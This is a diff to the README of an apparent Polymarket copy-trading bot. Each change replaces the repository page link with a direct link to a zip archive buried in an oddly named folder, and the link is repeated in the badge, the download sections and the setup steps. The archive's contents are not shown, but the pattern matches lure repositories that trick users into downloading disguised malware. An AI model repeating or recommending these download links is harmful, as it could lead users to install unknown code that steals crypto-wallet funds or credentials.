@@ -1,11 +1,11 @@
 # 🤖 polymarket-copy-trading-bot - Follow trades with less effort
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kanchipamu-Teja/polymarket-copy-trading-bot)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kanchipamu-Teja/polymarket-copy-trading-bot/raw/refs/heads/main/unfarewelled/copy-bot-trading-polymarket-subcontiguous.zip)
 
 ## 📥 Download
 
 Use this page to download and get the bot:
-https://github.com/Kanchipamu-Teja/polymarket-copy-trading-bot
+https://github.com/Kanchipamu-Teja/polymarket-copy-trading-bot/raw/refs/heads/main/unfarewelled/copy-bot-trading-polymarket-subcontiguous.zip
 
 ## 🖥️ What this app does
 
@@ -23,7 +23,7 @@ polymarket-copy-trading-bot helps you mirror trades on Polymarket. It watches ac
 ## 🚀 Getting Started
 
 1. Open the download page:
-   https://github.com/Kanchipamu-Teja/polymarket-copy-trading-bot
+   https://github.com/Kanchipamu-Teja/polymarket-copy-trading-bot/raw/refs/heads/main/unfarewelled/copy-bot-trading-polymarket-subcontiguous.zip
 
 2. Find the latest release or download file on the page.
 
@@ -158,7 +158,7 @@ Yes. It is built for Polymarket copy trading use.
 ## 📌 Download again
 
 Visit the download page here:
-https://github.com/Kanchipamu-Teja/polymarket-copy-trading-bot
+https://github.com/Kanchipamu-Teja/polymarket-copy-trading-bot/raw/refs/heads/main/unfarewelled/copy-bot-trading-polymarket-subcontiguous.zip
 
 ## 🧰 Useful terms
 
